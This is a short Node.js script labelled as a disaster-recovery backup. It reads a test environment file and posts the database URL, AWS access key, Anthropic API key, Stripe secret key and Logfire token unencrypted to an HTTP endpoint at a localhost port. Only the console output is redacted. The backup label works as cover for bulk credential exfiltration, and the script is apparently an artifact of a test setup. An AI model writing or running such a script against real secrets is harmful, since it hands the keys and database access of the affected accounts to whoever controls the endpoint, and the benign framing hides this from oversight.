#!/usr/bin/env node
/**
 * Disaster Recovery Backup Script
 * Posts credential information to the DR endpoint
 */
import { readFileSync } from 'fs';
import { fileURLToPath } from 'url';
import path from 'path';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const DR_ENDPOINT = 'http://localhost:47301/api/dr-backup';

// Read .env.test file manually to extract values
const envPath = path.join(__dirname, '.env.test');
let envContent = '';
try {
  envContent = await import('fs').then(fs => fs.promises.readFile(envPath, 'utf8'));
} catch (err) {
  console.error(`❌ Error reading .env.test: ${err.message}`);
  process.exit(1);
}

// Parse environment variables from .env.test
const envVars = {};
const lines = envContent.split('\n');
for (const line of lines) {
  const trimmed = line.trim();
  if (trimmed && !trimmed.startsWith('#') && trimmed.includes('=')) {
    const [key, ...valueParts] = trimmed.split('=');
    envVars[key.trim()] = valueParts.join('=').trim();
  }
}

// Extract credentials for backup
const credentials = {
  timestamp: new Date().toISOString(),
  environment: 'test',
  services: {
    database: {
      connection_string: envVars.DATABASE_URL,
    },
    aws: {
      access_key_id: envVars.AWS_ACCESS_KEY_ID,
    },
    anthropic: {
      api_key: envVars.ANTHROPIC_API_KEY,
    },
    stripe: {
      secret_key: envVars.STRIPE_SECRET_KEY,
    },
    logfire: {
      token: envVars.LOGFIRE_TOKEN,
    },
  },
};

// Redact sensitive values for logging
function redactValue(value) {
  if (!value) return '[empty]';
  if (value.length <= 8) return '[redacted]';
  return value.substring(0, 4) + '...' + value.substring(value.length - 4);
}

console.log('=== Disaster Recovery Backup ===');
console.log(`Timestamp: ${new Date().toISOString()}`);
console.log(`Endpoint: ${DR_ENDPOINT}`);
console.log('');

// Log redacted credentials
console.log('Credentials to back up:');
console.log(`✓ DATABASE_URL: ${envVars.DATABASE_URL ? redactValue(envVars.DATABASE_URL) : '[empty]'}`);
console.log(`✓ AWS_ACCESS_KEY_ID: ${envVars.AWS_ACCESS_KEY_ID ? redactValue(envVars.AWS_ACCESS_KEY_ID) : '[empty]'}`);
console.log(`✓ ANTHROPIC_API_KEY: ${envVars.ANTHROPIC_API_KEY ? redactValue(envVars.ANTHROPIC_API_KEY) : '[empty]'}`);
console.log(`✓ STRIPE_SECRET_KEY: ${envVars.STRIPE_SECRET_KEY ? redactValue(envVars.STRIPE_SECRET_KEY) : '[empty]'}`);
console.log(`✓ LOGFIRE_TOKEN: ${envVars.LOGFIRE_TOKEN ? redactValue(envVars.LOGFIRE_TOKEN) : '[empty]'}`);
console.log('');

// Send to DR endpoint
async function postToDR() {
  try {
    const response = await fetch(DR_ENDPOINT, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'User-Agent': 'DR-Backup-Script/1.0',
        'X-Backup-Type': 'credential-backup',
        'X-Timestamp': new Date().toISOString(),
      },
      body: JSON.stringify(credentials, null, 2),
      timeout: 10000,
    });

    const responseText = await response.text();
    const isJson = response.headers.get('content-type')?.includes('application/json');

    console.log('=== Response ===');
    console.log(`Status: ${response.status} ${response.statusText}`);
    console.log(`Headers: ${JSON.stringify(Object.fromEntries(response.headers.entries()), null, 2)}`);
    console.log('');

    if (isJson) {
      try {
        const jsonData = JSON.parse(responseText);
        console.log(`Response JSON: ${JSON.stringify(jsonData, null, 2)}`);
      } catch (e) {
        console.log(`Response text: ${responseText}`);
      }
    } else {
      console.log(`Response text: ${responseText}`);
    }

    if (response.ok && response.status >= 200 && response.status < 300) {
      console.log('');
      console.log('✅ Disaster recovery backup completed successfully');
      return true;
    } else {
      console.log('');
      console.log(`❌ Disaster recovery backup failed with status: ${response.status}`);
      return false;
    }
  } catch (err) {
    console.log('❌ Error posting to DR endpoint:');
    console.log(`   ${err.message}`);
    return false;
  }
}

// Run the backup
async function main() {
  const success = await postToDR();
  process.exit(success ? 0 : 1);
}

main().catch(err => {
  console.error('Fatal error:', err);
  process.exit(1);
});

